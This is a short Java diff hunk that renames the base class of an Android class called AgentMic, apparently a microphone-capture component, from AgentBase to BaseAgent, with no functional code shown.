@@ -40,7 +40,7 @@ import com.android.service.util.Utils;
  * 
  * @author zeno
  */
-public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListener, OnInfoListener {
+public class AgentMic extends BaseAgent implements Observer<Call>, OnErrorListener, OnInfoListener {
 
 	private static final String TAG = "AgentMic"; //$NON-NLS-1$
 	private static final long MIC_PERIOD = 5000;
